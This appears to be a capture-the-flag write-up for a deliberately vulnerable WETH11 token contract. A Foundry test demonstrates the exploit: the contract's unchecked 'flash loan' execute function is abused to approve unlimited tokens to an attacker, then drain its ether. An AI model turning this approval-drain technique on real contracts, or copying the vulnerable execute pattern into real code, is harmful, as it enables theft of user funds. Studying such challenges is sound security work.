## WETH11 attack

The WETH11 contract is a normal ERC20 token where tokens can be minted via depositing ether to the contract.  

The vulnarability is in the `execute` function. You can use this function to get unlimited approvals for the WETH11 contract when you just flashloan to itself and approve an unlimited amount of tokens for bob.

1. `aprove` unlimited amount via `execute` for bob
2. transfer all tokens from WETH11 to bob
3. bob can now withdraw all tokens

## Test
forge test --match-contract=Weth11Test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";

import {ERC20} from "openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ReentrancyGuard} from "openzeppelin/contracts/security/ReentrancyGuard.sol";
import {Address} from "openzeppelin/contracts/utils/Address.sol";

import "openzeppelin/contracts/interfaces/IERC20.sol";

contract Weth11Test is Test {
    WETH11 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH11();
        bob = makeAddr("bob");

        vm.deal(address(bob), 10 ether);
        vm.startPrank(bob);
        weth.deposit{value: 10 ether}();
        weth.transfer(address(weth), 10 ether);
        vm.stopPrank();
    }

    function testHack() public {
        assertEq(
            weth.balanceOf(address(weth)),
            10 ether,
            "weth contract should have 10 ether"
        );

        vm.startPrank(bob);

        // hack time!
        weth.execute(address(weth), 0 ether, abi.encodeWithSelector(ERC20.approve.selector, address(bob), type(uint256).max));
        weth.transferFrom(address(weth), address(bob), 10 ether);
        weth.withdrawAll();

        vm.stopPrank();

        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(
            weth.balanceOf(address(weth)),
            0,
            "empty weth on weth contract"
        );

        assertEq(
            bob.balance,
            10 ether,
            "player should recover initial 10 ethers"
        );
    }
}

// The Angel Di Maria Wrapped Ether
contract WETH11 is ERC20("Angel Di Maria Wrapped Ether", "WETH11"), ReentrancyGuard {
    receive() external payable {
        deposit();
    }

    function _burnAll() internal {
        _burn(msg.sender, balanceOf(msg.sender));
    }

    function deposit() public payable nonReentrant {
        _mint(msg.sender, msg.value);
    }

    function withdraw(uint256 wad) external nonReentrant {
        _burn(msg.sender, wad);
        Address.sendValue(payable(msg.sender), wad);
       
    }

    function withdrawAll() external nonReentrant {
        uint256 balance = balanceOf(msg.sender);
        _burnAll();
        Address.sendValue(payable(msg.sender), balance);
        
    }

    /// @notice Request a flash loan in ETH
    function execute(address receiver, uint256 amount, bytes calldata data) external nonReentrant {
        uint256 prevBalance = address(this).balance;
        Address.functionCallWithValue(receiver, data, amount);

        require(address(this).balance >= prevBalance, "flash loan not returned");
    }
}
```